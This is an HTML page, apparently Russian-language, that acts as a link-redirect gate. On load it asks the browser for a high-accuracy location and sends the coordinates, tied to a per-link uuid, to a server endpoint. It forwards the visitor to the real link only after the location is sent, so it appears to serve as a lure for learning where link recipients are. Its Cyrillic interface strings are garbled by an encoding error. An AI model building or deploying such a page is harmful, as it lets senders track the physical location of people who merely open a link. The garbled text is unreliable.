<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Locating...</title>
  <style>
    body {
      margin: 0;
      font-family: 'Helvetica Neue', sans-serif;
      background-color: #f6f6f6;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .loader {
      border: 6px solid #e0e0e0;
      border-top: 6px solid #4caf50;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    p {
      font-size: 1rem;
      text-align: center;
      max-width: 300px;
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <p>–û–ø—Ä–µ–¥–µ–ª—è–µ–º –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ‚Ä¶</p>

  <script>
      console.log('üìç –ó–∞—à–ª–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É location.html');
    const params = new URLSearchParams(window.location.search);
    const uuidFromURL = params.get("uuid");
    console.log('üß¨ UUID –∏–∑ —Å—Ç—Ä–æ–∫–∏ –∑–∞–ø—Ä–æ—Å–∞ =', uuidFromURL);
    
    async function sendLocation(position) {
      const params = new URLSearchParams(window.location.search);
      const uuid = params.get("uuid");

      if (!uuid) return;

      try {
        const response = await fetch('/api/get-link', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            uuid,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        });

        const data = await response.json();
        if (data.redirectTo) {
          window.location.href = data.redirectTo;
        } else {
          document.querySelector('p').textContent = "–û—à–∏–±–∫–∞: —Å—Å—ã–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.";
        }
      } catch (e) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ª–æ–∫–∞—Ü–∏–∏:", e);
        document.querySelector('p').textContent = "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ª–æ–∫–∞—Ü–∏–∏.";
      }
    }

    function handleError() {
      document.querySelector('p').textContent = "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é.";
    }

    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
      enableHighAccuracy: true,
      timeout: 10000
    });
  </script>
</body>
</html>
